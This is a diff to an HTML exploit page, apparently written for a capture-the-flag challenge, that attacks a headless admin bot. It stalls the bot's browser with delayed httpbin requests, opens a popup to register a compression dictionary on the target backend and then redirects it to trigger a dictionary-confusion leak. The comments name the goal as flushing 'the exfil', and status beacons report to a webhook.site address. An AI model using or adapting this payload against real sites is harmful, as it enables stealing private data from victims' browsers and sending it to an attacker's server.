@@ -1,20 +1,20 @@
 <!doctype html>
 <html><head><meta charset="utf-8"><title>a</title></head>
 <body><h1>loading</h1>
-<!-- hanging resource keeps page from networkidle0 so bot goto() waits ~10s -->
-<img src="http://10.255.255.1/keepalive" style="display:none">
+<!-- RELIABLE keepalive: a public endpoint that delays its response ~10s so the bot's
+     goto(networkidle0) never settles and the browser stays open long enough for the
+     popup to register + confuse + flush the exfil. (10.x was refused instantly on the
+     arena net, closing the browser too early.) -->
+<img src="https://httpbin.org/delay/10" style="display:none">
+<img src="https://httpbin.org/delay/10" style="display:none">
 <script>
 const q = new URLSearchParams(location.search);
 const B = (q.get('b') || 'http://backend:8080').replace(/\/+$/,'');
 const P = '2';
 const WT = q.get('w') || '';
 function bx(s){ if(WT) new Image().src='https://webhook.site/'+WT+'/S?'+s+'&t='+Date.now(); }
-bx('step=loaded&ver=d2&B='+encodeURIComponent(B));
-// register RB dict by loading /api/content/P/1 DIRECTLY (only this dict gets registered,
-// so the confused /2 nav decompresses against RB exactly). Avoid /post/P (its inline script
-// fetches /2 and would register the decoded doc as a competing dictionary).
-const w = window.open(B + '/api/content/' + P + '/1', 'x');
-// give registration ample time (live bot has no debug-logging slowdown -> faster than local)
+bx('step=loaded&ver=d3&B='+encodeURIComponent(B));
+const w = window.open(B + '/api/content/' + P + '/1', 'x');   // register RB (direct /1, no competing dict)
 setTimeout(function(){ bx('step=nav'); try { w.location = B + '/api/content/' + P + '/2'; } catch (e) {} }, 5000);
 </script>
 </body></html>
